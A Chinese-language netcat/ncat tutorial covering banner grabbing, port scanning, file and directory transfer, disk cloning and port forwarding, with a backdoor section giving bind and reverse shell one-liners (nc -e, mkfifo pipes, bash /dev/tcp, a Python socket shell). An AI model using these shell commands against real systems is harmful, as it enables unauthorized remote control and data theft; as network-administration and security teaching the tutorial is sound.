# NETCAT--NC

> `NC`=`NETCAT` ==> `NCat` ==> `NMap`  
> `ncat`命令属于`nc`命令的强化版，有一些参数会不一致
> 在红帽发行版中: 
> * 6: 存在`nc`和`nmap`两个包, `ncat`命令需要安装`nmap`
> * 7: `nc`是`ncat`的软链接, 来自于`nmap-ncat`包

* 网络工具中的瑞士军刀
* 侦听模式/传输模式
* telnet/获取banner信息
* 传输文本信息
* 传输文件/目录
* 加密传输文件
* 远程控制/木马
* 加密所有流量
* 流媒体服务器
* 远程克隆硬盘

## NC--TELNET/BANNER

测试22端口: 

```sh
shell> nc -nv 192.168.1.62 22
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.1.62:22.
SSH-2.0-OpenSSH_5.3
```

连接25端口发送邮件:

```sh
shell> nc -v smtp.163.com 25
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 220.181.12.14:25.
220 163.com Anti-spam GT for Coremail System (163com[20141201])
```

端口扫描(ncat没有此功能，需要使用`netcat`或者`nmap`)：

```sh
nc -nv -z -w 1 [target_IP] [Start_target_port-Stop_target_port]

# -w: 设置连接超时时间
# -z: zero I/O 模式，专用于端口扫描。表示对目标IP发送的数据表中不包行任何payload，这样可以加快扫描的速度。
```

获取banner:

```sh
echo " " | nc -nv -z -w 1 [target_IP] [Start_target_port-Stop_target_port]
```


## NC--传输文本信息

服务端使用 `nc` 监听一个端口，客户端连接此端口以后，可以发送文本信息。

交互界面相互发送信息(有一边断开，数据就无法发送，连接失效)：

> `nc`与`ncat`存在区别： 
> * (1)
>   * 服务端使用`nc`发起监听，服务端断开以后，客户端也会自动断开；
>   * 服务端使用`ncat` 发起监听，服务端断开以后，客户端不会自动断开(`CLOSE_WAIT`)，发送数据的时候检测失败，才会提示`Ncat: Broken pipe.`；
>   * 客户端断开，两者服务端都会断开
> * (2)
>   * 服务端使用`nc` 通过管道发送数据，传输结束后会自动中断
>   * 服务端使用`ncat`通过管道发送数据，传输结束后不会自动中断; 此时服务端可以接收数据, 但无法发送(**此时`ncat`需要从标准输出接受数据**)
> * (3)
>   * `ncat`无端口扫描功能，需要使用`nmap`或者单独安装`nc`


```sh
A: nc -l 333
B: nc -nv <IP-A> 333
```

利用管道符发送信息：

> 注: `ncat`不自动断开连接，可以使用 `-i <N>` 指定自动断开时间(s) (有些发行版需要使用 `-q <N>`)

```sh
A: nc -l 333
B: lsof | nc -nv <IP-A> 333
B: ps -ef | nc -nv <IP-A> 333 -q 1     # 发送成功，等待1s自动断开连接
```

服务端保持持久监听(即使客户端连接断开，服务端一直保持监听)：

```sh
A: nc -l 333 -k                        # 7版本还可以使用长参数 --keep-open
B: nc -nv <IP-A> 333
B: nc -nv -s <IP-B> <PORT> <IP-A> 333  # 指定发起连接的IP和端口
```

## NC--传输文件/目录

* **传输文件**

```sh
A: nc -l 333 > video1.mp4
B: nc -nv <IP> 333 < video1.mp4
```

```sh
A: nc -l 333 < video2.mp4
B: nc -nv <IP> 333 > video2.mp4
```

* **传输目录**

```sh
A: tar cf - dir/ | nc -l 333
B: nc -nv <IP> 333 | tar xf -
```

* **加密传输文件**

```sh
A: nc -l 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > video3.mp4
B: mcrypt --flush -Fbq -a rijndael-256 -m ecb < video3.mp4 | nc -nv <IP> 333
```

## NC--远程克隆硬盘

```sh
A： nc -l 333 | dd of=/dev/sda
B: dd if=/dev/sda | nc -nv <IP-A> 333
```


## NC--网络控制/建立后门/反弹shell

监听型(客户端使用服务端shell)：

```sh
A: nc -l 333 -e /bin/bash
B: nc -nc <IP-A> 333
```

连接型(服务端可使用客户端shell)：

```sh
A: nc -l 333
B: nc -nv <IP-A> 333 -e /bin/bash
```

> RHEL6 安装的`nc`不支持`-e`和`-c`选项，需要使用`ncat`，或者使用以下几种办法方法。

监听型：

```sh
A: mkfifo /tmp/backpipe
A: cat /tmp/backpipe | /bin/bash -i 2>&1 | nc -l 333 >/tmp/backpipe
B: nc -nv <IP-A> 333
```

连接型：

```sh
A: nc -l 333
B: mknod /tmp/backpipe p    # 等同于 mkfifo /tmp/backpipo
B: /bin/bash 0</tmp/backpipe | nc <IP-A> 333 >/tmp/backpipe
```

两个端口实现：

```sh
A: nc -l 333
A: nc -l 334
B: nc -nv <IP-A> 333 | /bin/bash 2>&1 | nc -nv <IP-A> 334  # 333端口接受输入，334端口发送输出
```


一端未安装`netcat`或者`ncat`(监听型)：

* shell实现

```sh
A: nc -l 333
B: /bin/bash -i >& /dev/tcp/<IP-A>/333 0>&1

# /bin/bash -i : 交互模式启动bash shell
# >& : 重定向符，如果在其后面加文件描述符， 则将bash -i交互模式传递给文件描述符号；如果是文件，则传递给文件
#      /dev/tcp/<IP>/<PORT> 表示传递给远程主机的TCP <IP:PORT>端口
# 文件描述符： 0: 标准输入；1: 标准输出；2:标准错误 
# 0>&1 : 标准输入重定向到标准输出，实现远程的输入可以在远程输出对应的内容(B端的输入能够作为输出被A端bash接受)
```

* Python实现

```sh
A: nc -l 333
B: python -c "import os, socket, subprocess; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('<IP-A>', 333)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(['/bin/bash', '-i']);"
```

## NC--连接转发/端口转发

```sh
A: nc -l 333
B: nc -l 333 -e '/usr/bin/nc <IP-A> 333'
C: nc -l <IP-B> 333

# 编辑脚本/root/B_to_A_333.sh, 内容为 /usr/bin/nc <IP-A> 333
# 这样的话， 以下两条中方式都可以实现以上的同等效果
B: nc -l 333 -c '/root/B_to_A_333.sh'
B: nc -l 333 -e '/bin/bash /root/B_to_A_333.sh'
```



本文参考资料来源有：

* 2019最新黑客工具——Netcat的使用： [https://www.bilibili.com/video/BV16t411c7nd](https://www.bilibili.com/video/BV16t411c7nd)
* B站UP主"东坡东坡肉"的投稿： [https://www.bilibili.com/video/BV1gJ411t7R7](https://www.bilibili.com/video/BV1gJ411t7R7)
